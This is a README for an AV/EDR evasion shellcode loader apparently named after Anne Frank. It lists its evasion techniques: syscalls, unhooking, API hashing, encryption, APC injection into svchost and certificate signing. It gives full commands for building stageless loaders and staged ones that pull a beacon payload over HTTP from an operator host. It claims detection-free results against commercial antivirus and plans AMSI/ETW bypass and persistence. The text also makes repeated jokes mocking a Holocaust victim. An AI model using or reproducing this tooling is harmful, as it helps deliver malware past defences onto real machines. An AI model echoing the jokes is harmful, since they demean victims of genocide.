## Goal

This repository was created to facilitate AV/EDR evasion during CTFs and red team engagements. The goal is to focus more on pwning rather than struggling with detection!

Your shellcode hides better than Anne Frank in the annex – until some nosy neighbor (Defender) rats it out.

## General Information

>[!CAUTION]
>This tool is designed for authorized operations only. 

>[!NOTE]
>- The techniques used in the loader are nothing new. The loader generated from this packer will probably NOT evade modern AVs / EDRs long-term. Do not expect miracles – she still gets discovered after ~2 years.
>- Most of the evasion techniques used here are NOT from me. I just crammed a bunch of known tricks together like hiding them in an attic.
>- Depending on the interest shown to this project, I might add some techniques from my own research and maybe rewrite the whole thing into a much more capable injector.

## Evasion Features

- **Stageless**: Shellcode embedded directly into the loader.
- **Staged**: Shellcode fetched via HTTP (encrypted on the fly).
- **Evasion**:  
  - Indirect syscalls (Syswhispers)  
  - API hashing (Djb2)  
  - NTDLL unhooking (KnownDLLs)  
  - AES-128-CBC encryption  
  - EarlyBird APC injection into `RuntimeBroker.exe` or `svchost.exe`  
  - Function/variable name scrambling (`-s`)
- **Output**: EXE or DLL (exported function `af`).
- **Code signing**: Optional with a PFX certificate.

## Installation

### Prerequisites

- **Python 3.8+** and `pip`
- **MinGW‑w64** cross‑compiler (to build Windows executables)
- **NASM** (for assembly code)
- **osslsigncode** (optional, for signing)

**On Kali / Debian‑based Linux:**

```bash
sudo apt update
sudo apt install clang mingw-w64 nasm lld osslsigncode
```

**On Windows:**  
Install [MSYS2](https://www.msys2.org/), then in its terminal:

```bash
pacman -Syu
pacman -S mingw-w64-x86_64-clang make nasm
```

### Install AnneFrankInjector

1. **Clone the repository** (or download the ZIP) and enter the folder:

   ```bash
   git clone https://github.com/Excalibra/AnneFrankInjector.git
   cd AnneFrankInjector
   ```

2. **Install Python dependencies** (choose one method):

   - **Virtual environment (recommended)**  
     ```bash
     python3 -m venv env
     source env/bin/activate      # Linux
     env\Scripts\activate          # Windows
     pip install -r requirements.txt
     ```

   - **Global installation (pipx)** – makes `afpacker` available system‑wide  
     ```bash
     pipx install .
     ```

   - **Old‑fashioned**  
     ```bash
     pip install -r requirements.txt --break-system-packages
     ```

> **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.

## Usage

### 1. Graphical Interface (Recommended)

Run the GUI from the project root:

```bash
python af.py
```

The window lets you:
- Select your raw shellcode file (`.bin`).
- Choose between **Stageless** (embed) or **Staged** (HTTP download).
- Set options like encryption, scrambling, output format (EXE/DLL), APC target, and code signing.
- Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.

### 2. Command‑line Interface

After installation (or from the `Linux` folder), you can use the `afpacker` command (or `python main.py`). The syntax is similar to the original CTFPacker.

#### Stageless (embed shellcode)

```bash
afpacker stageless -p payload.bin -e -s -o myloader
```

- `-p` : raw shellcode file
- `-e` : encrypt the shellcode
- `-s` : scramble function/variable names
- `-o` : output filename (without extension; default `afloader`)
- `-f DLL` : build a DLL instead of EXE

#### Staged (fetch shellcode via HTTP)

```bash
afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader
```

- `-i` : IP address of the HTTP server
- `-po` : port
- `-pa` : path on the server (e.g., `/shellcode.bin`)

#### Code signing

Add `-pfx cert.pfx -pfx-pass password` to any command to sign the output file.

#### Output format

Add `-f DLL` to produce a DLL. The exported function is named `af`. Execute it with:

```cmd
rundll32.exe afloader.dll,af
```

## Examples

**Stageless, encrypted, scrambled EXE** (no signing):

```bash
afpacker stageless -p calc.bin -e -s
# Creates afloader.exe
```

**Staged DLL, custom output name**:

```bash
afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon
# Creates beacon.dll
```



## To-Do

- [x] Setup.py / pipx support
- [ ] More injection techniques (maybe "Betrayed by Neighbor" self-delete)
- [ ] AMSI / ETW bypass (because even the diary needs silencing)
- [ ] Persistence features

## Detections

- Undetected on the latest Windows 11 Defender
- Undetected on Windows 10 Defender
- Undetected on Sophos, Kaspersky, etc.
